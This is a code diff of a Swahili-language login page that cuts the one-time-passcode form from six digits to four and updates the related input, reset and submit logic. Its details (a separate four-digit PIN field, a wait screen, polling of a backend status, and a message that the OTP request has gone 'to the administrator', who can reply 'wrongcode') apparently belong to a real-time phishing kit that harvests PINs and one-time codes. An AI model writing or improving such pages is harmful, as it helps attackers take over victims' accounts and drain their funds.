@@ -513,8 +513,6 @@
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
           <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,4)" id="o4">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,5)" id="o5">
         </div>
         <div class="otp-resend" id="otpRs">Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde</div>
         <button class="btn-otp" id="bOtp" onclick="doOtp()">WASILISHA</button>
@@ -875,12 +873,12 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // OTP INPUT HELPERS (6 digits)
+  // OTP INPUT HELPERS (4 digits)
   // ══════════════════════════════════════════════════════
   function otpMv(el, i) {
     el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3,4,5].every(j => document.getElementById('o'+j).value);
+    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
+    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
     document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
   }
 
@@ -922,7 +920,7 @@
       if (data.success) {
         showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
         startRs();
-        [0,1,2,3,4,5].forEach(i => { document.getElementById('o'+i).value = ''; });
+        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
         document.getElementById('bOtp').className = 'btn-otp';
         document.getElementById('o0').focus();
       } else {
@@ -934,13 +932,13 @@
   }
 
   // ══════════════════════════════════════════════════════
-  // OTP SUBMIT (6 digits)
+  // OTP SUBMIT (4 digits)
   // ══════════════════════════════════════════════════════
   async function doOtp() {
-    const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
+    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
 
-    if (otp.length < 6) {
-      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 6 za OTP yako.');
+    if (otp.length < 4) {
+      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 4 za OTP yako.');
       return;
     }
 
@@ -1022,7 +1020,7 @@
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
             document.getElementById('bLogin').disabled = false;
-            [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
+            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
             document.getElementById('pinWait').classList.remove('show');
@@ -1037,7 +1035,7 @@
 
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
-          [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
+          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
           showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
